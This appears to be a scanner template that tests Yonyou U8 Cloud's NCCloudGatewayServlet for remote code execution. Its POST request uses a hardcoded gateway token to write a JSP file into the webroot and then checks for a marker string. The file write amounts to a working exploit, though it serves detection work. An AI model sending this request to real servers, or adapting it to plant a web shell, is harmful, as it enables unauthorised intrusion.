id: yonyou-u8-cloud-nccloudgatewayservlet-rce

info:
  name: 用友 U8 Cloud NCCloudGatewayServlet 命令执行漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    用友U8-Cloud是用友网络推出的一款面向成长型企业的全面云ERP平台，集财务、供应链、生产制造、进销存管理于一体，同时提供智能决策支持、供应链协同、移动办公及实时数据分析等功能，助力企业实现数字化转型与高效运营。用友 U8 Cloud NCCloudGatewayServlet存在命令执行漏洞，攻击者可以获取服务器权限执行命令
    fofa: app="用友-NC-Cloud"
  tags: yonyou,u8,rce
  created: 2025/10/30
  requires: [yonyou]
  requires-mode: opportunistic

set:
  randstr: randomLowercase(6)
rules:
  r0:
    request:
      method: POST
      path: /service/NCCloudGatewayServlet
      headers:
        Content-Type: application/json
        gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
      body: |
        {
        "groupCode": "1002",
        "user": "1002",
        "serviceInfo": {
          "serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
          "serviceMethodName": "writeDocToXMLFile",
          "serviceMethodArgInfo": [
            {
              "argType": {
                "body": "java.lang.Byte"
              },
              "argValue": {
                "body": [60, 37, 32, 111, 117, 116, 46, 112, 114, 105, 110, 116, 108, 110, 40, 34, 89, 79, 78, 89, 79, 85, 95, 82, 67, 69, 95, 86, 85, 76, 78, 34, 41, 59, 32, 37, 62]
              },
              "agg": false,
              "isArray": true,
              "isPrimitive": true
            },
            {
              "argType": {
                "body": "java.lang.String"
              },
              "argValue": {
                "body": "./webapps/u8c_web/{{randstr}}.jsp"
              },
              "agg": false,
              "isArray": false,
              "isPrimitive": false
            }
          ]
          }
        }
    expression: |
      response.status == 200 &&
      response.body.bcontains(b'"agg"') &&
      response.body.bcontains(b'"retObj"') &&
      response.body.bcontains(b'"retClass"')
  r1:
    request:
      method: GET
      path: /{{randstr}}.jsp
    expression: response.status == 200 && response.body.bcontains(b'YONYOU_RCE_VULN')
expression: r0() && r1()
